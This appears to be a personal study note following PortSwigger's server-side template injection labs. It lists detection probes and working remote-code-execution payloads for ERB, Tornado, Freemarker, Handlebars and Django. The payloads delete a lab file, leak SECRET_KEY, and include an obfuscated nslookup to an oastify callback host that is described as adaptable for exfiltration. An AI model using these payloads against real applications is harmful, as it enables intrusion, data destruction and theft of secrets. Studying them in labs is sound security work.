![[SSTI.webp]]
# Recon

To detect and identify SSTI, there are some techniques available [here](https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack), but in short, some payloads to try include:

-  `{{7*7}}`
- `${7*7}`
- `<%=7*7%>`
- `%{7*test}`
- `{{this}}{{self}}`
- `${{<%[%'"}}%\`
# Cheat Sheet

Some useful cheat sheets include:

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

An obfuscation example that can help to bypass filtering is the following:

```bash
<%system("nslookup $(e`echo ch`o hello).yvxfjnpedf14.oastify.com")%>
```

This will append the string "hello" to Burp Collaborator. This can be changed to exfiltrate data.
# Basic Server-Side Template Injection

Some Ruby ERB Template Syntax payload:

```ruby
<%=7*7%>
```

If the payload is successful, then in the response you should see the value of 49. The following payload can be used to execute an OS command that deletes a file from the server:

```ruby
<%system("rm /home/carlos/morale.txt")%>
```

Some other payloads for enumeration include:

```ruby
{{7*7}}
${7*7}
```

# Basic Server-Side Template Injection (Code Context)

This can be used for a Tornado web template engine. Try to trigger an error message in the app - sometimes the app will disclose the template that is is using. Some payloads to try include:

```ruby
{{7*7}}
${7*7}
```

The syntax needs to be valid for successful execution of the payload. Another to try includes:

```ruby
}}{{7*7
```

This payload may return the value of 49. The following payload can be used to execute an OS command that deletes a file from the server:

```ruby
}}{%import+os%}{{os.system("rm+/home/carlos/morale.txt")
```
# Server-Side Template Injection Using Documentation

For Freemarker template engine, attempt to trigger an overly verbose error message on the app, which discloses the template engine in use:

```ruby
${7*test}
```

The following payload can be used to execute an OS command that deletes a file from the server:

```ruby
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```
# Server-Side Template Injection with a Documented Exploit

>[!info] Resource 
>https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

For Handlebars templating engine, you can try and identify it via the following payload:

```javascript
{{this}}{{self}}
```

Using the payload mentioned in the resource, swap out the following line of code:

```javascript
return JSON.stringify(process.env);
```

Then inject either of the following payloads in its place, then URL encode the entire payload String before submitting the payload back to the application:

```javascript
return require('child_process').execSync('rm /home/carlos/morale.txt');
return require('child_process').exec('rm /home/carlos/morale.txt');
```
# SSTI with Disclosure via User-Supplied Objects

For a Django template engine, a payload can be used to disclose debug information:

```javascript
{% debug %}
```

The “settings” Object can be used to retrieve sensitive information from the template engine configuration.

```javascript
{{settings.SECRET_KEY}}
```
# SSTI in a Sandboxed Environment

- See lab/document information. - [https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)
# SSTI with a Custom Exploit

- See lab/document information. - [https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)

